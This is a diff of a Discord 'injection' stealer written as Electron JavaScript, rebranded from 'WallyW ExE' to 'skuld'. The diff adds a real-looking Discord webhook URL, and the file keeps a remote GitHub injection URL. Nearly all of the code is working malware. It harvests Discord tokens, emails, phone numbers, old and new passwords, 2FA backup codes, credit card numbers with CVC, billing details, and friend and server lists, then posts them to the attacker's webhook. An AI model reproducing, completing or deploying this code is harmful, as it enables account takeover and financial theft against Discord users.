@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK_URL%",
+    webhook: "https://discord.com/api/webhooks/1288503236541812867/V_CYj87j8gwdMdnqN0I34Mjf0mffgYDlUcz2JLTfPK4FuuRQcb5_5GxpXcTr06zIMrWV",
     injection_url: "https://raw.githubusercontent.com/69WallyW69/dwad2r1f21faawa/refs/heads/main/index.js",
     filters: {
         urls: [
@@ -147,14 +147,17 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "WallyW ExE - Discord Injection";
-    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&";
+    content["username"] = "skuld - cord injection";
+    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["embeds"][0]["author"] = {
+        "name": account.username,
+    };
     content["embeds"][0]["thumbnail"] = {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "WallyW ExE Discord Injection | @t.me/wm4rket",
-        "icon_url": "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&",
+        "text": "skuld discord injection - made by hackirby",
+        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -166,33 +169,33 @@ const hooker = async (content, token, account) => {
     const servers = await getServers(token);
 
     content["embeds"][0]["fields"].push({
-        "name": "<:WallyW_Token:1270729277037346828>Token",
+        "name": "Token",
         "value": "```" + token + "```",
         "inline": false
     }, {
-        "name": "<:WallyW_Nitrotype:1270729274168705177>Nitro",
+        "name": "Nitro",
         "value": nitro,
         "inline": true
     }, {
-        "name": "<:WallyW_Event:1270736055812751499>Badges",
+        "name": "Badges",
         "value": badges,
         "inline": true
     }, {
-        "name": "<:WallyW_Preview:1270736421199548466>Billing",
+        "name": "Billing",
         "value": billing,
         "inline": true
     });
 
     content["embeds"].push({
-        "title": `<:WallyW_List:1270729268988739635> Total Friends: ${friends.totalFriends}`,
+        "title": `Total Friends: ${friends.totalFriends}`,
         "description": friends.message,
     }, {
-        "title": `<:WallyW_List:1270729268988739635> Total Servers: ${servers.totalGuilds}`,
+        "title": `Total Servers: ${servers.totalGuilds}`,
         "description": servers.message,
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed][""] = 0x2b2d31;
+        content["embeds"][embed]["color"] = 0xb143e3;
     }
 
     await request("POST", CONFIG.webhook, {
@@ -220,11 +223,11 @@ const fetchFriends = async token => await fetch("/relationships", {
 const getNitro = flags => {
     switch (flags) {
         case 1:
-            return '<:WallyW_NitroBadge:1270730341526798387>';
+            return '`Nitro Classic`';
         case 2:
-            return '<:Nitro:1217503832389718200>';
+            return '`Nitro Boost`';
         case 3:
-            return '<:WallyW_NitroBadge:1270730341526798387>';
+            return '`Nitro Basic`';
         default:
             return '`❌`';
     }
@@ -255,10 +258,10 @@ const getBilling = async token => {
         if (!x.invalid) {
             switch (x.type) {
                 case 1:
-                    billing += '<:WallyW_BlackCard:1270728933175857243>';
+                    billing += '💳 ';
                     break;
                 case 2:
-                    billing += '<:WallyW_Paypal:1270728573459890247>';
+                    billing += '<:paypal:1148653305376034967> ';
                     break;
             }
         }
@@ -297,7 +300,7 @@ const getServers = async token => {
         if (rareGuilds === "") {
             rareGuilds += `**Rare Servers:**\n`;
         }
-        rareGuilds += `${guild.owner ? "<:WallyW_Owner:1273981094038995026> Owner" : "<:WallyW_Admin:1273981521342238793> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
     rareGuilds = rareGuilds || "**No Rare Servers**";
@@ -315,11 +318,11 @@ const EmailPassToken = async (email, password, token, action) => {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
             "fields": [{
-                "name": "<:WallyW_Mail:1270729270938964029>Email",
+                "name": "Email",
                 "value": "`" + email + "`",
                 "inline": true
             }, {
-                "name": "<:WallyW_Token:1270729277037346828>Password",
+                "name": "Password",
                 "value": "`" + password + "`",
                 "inline": true
             }]
@@ -341,19 +344,19 @@ const BackupCodesViewed = async (codes, token) => {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
     const content = {
-        "content": `**${account.username}** Just Checked Hes 2FA Codes!`,
+        "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
             "fields": [{
-                    "name": "<:WallyW_List:1270729268988739635>Backup Codes",
+                    "name": "Backup Codes",
                     "value": "```" + message + "```",
                     "inline": false
                 },
                 {
-                    "name": "<:WallyW_Mail:1270729270938964029>Email",
+                    "name": "Email",
                     "value": "`" + account.email + "`",
                     "inline": true
                 }, {
-                    "name": "<:WallyW_Ip:1270729267067490438>Phone",
+                    "name": "Phone",
                     "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }
@@ -369,14 +372,14 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** Just Changed Hes Password!`,
+        "content": `**${account.username}** just changed his password!`,
         "embeds": [{
             "fields": [{
-                "name": "<:WallyW_Token:1270729277037346828>New Password",
+                "name": "New Password",
                 "value": "`" + newPassword + "`",
                 "inline": true
             }, {
-                "name": "<:WallyW_Token:1270729277037346828>Old Password",
+                "name": "Old Password",
                 "value": "`" + oldPassword + "`",
                 "inline": true
             }]
@@ -390,18 +393,18 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** Just Added Credit Card!`,
+        "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
             "fields": [{
-                "name": "<:WallyW_Ip:1270729267067490438>Number",
+                "name": "Number",
                 "value": "`" + number + "`",
                 "inline": true
             }, {
-                "name": "<:WallyW_BlackCard:1270728933175857243>CVC",
+                "name": "CVC",
                 "value": "`" + cvc + "`",
                 "inline": true
             }, {
-                "name": "<:WallyW_Preview:1270736421199548466>Expiration",
+                "name": "Expiration",
                 "value": "`" + month + "/" + year + "`",
                 "inline": true
             }]
@@ -415,14 +418,14 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** Just Added Paypal Account!`,
+        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
         "embeds": [{
             "fields": [{
-                "name": "<:WallyW_Mail:1270729270938964029>Email",
+                "name": "Email",
                 "value": "`" + account.email + "`",
                 "inline": true
             }, {
-                "name": "<:WallyW_Mail:1270729270938964029>Phone",
+                "name": "Phone",
                 "value": "`" + (account.phone || "None") + "`",
                 "inline": true
             }]
@@ -462,15 +465,15 @@ async function initiation() {
         const account = await fetchAccount(token)
 
         const content = {
-            "content": `**${account.username}** Just Got Infected!`,
+            "content": `**${account.username}** just got injected!`,
 
             "embeds": [{
                 "fields": [{
-                    "name": "<:WallyW_Ip:1270729267067490438>Email",
+                    "name": "Email",
                     "value": "`" + account.email + "`",
                     "inline": true
                 }, {
-                    "name": "<:WallyW_Mail:1270729270938964029> Phone",
+                    "name": "Phone",
                     "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }]
